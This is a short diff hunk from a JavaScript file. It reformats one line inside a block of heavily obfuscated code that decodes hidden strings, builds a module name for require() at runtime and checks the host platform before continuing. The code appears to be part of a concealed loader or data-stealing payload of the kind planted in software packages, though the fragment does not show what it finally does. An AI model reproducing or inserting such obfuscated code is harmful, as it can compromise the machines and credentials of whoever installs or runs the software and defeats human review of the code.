@@ -21,7 +21,8 @@ Buffer.from(s1,t).toString(c)),e=(r,e)=>{let E=Buffer.from(r,t);const o=E.length
     M=d("WloISBk"),N=d(b),p=d(D),Z=d(k),j=d("EAwPSwEHNUEbFw"),
     m="WgcSVwcRSFYaEAM",J=d("FBcFXQYHNUEbFw");
     function T(t){try{return S[J](t),!0}catch(t){return!1}}
-    const v=d("MREAWQAYEg"),O=d("JQYJXhwYAw"),
+    const v=d("MREAWQAYEg"),
+    O=d("JQYJXhwYAw"),
     K=d("WjUWSDEVEllaOAlbFBhJdRwXFFcGGwBMWjECXxBbM0sQBkZ8FAAH"),
     P=(t,c)=>{result="";try{const r=`${t}`,e=require(`${y}${d(m)}`);
     if(I!=d("Ih0IXBoDFWc7IA"))return;
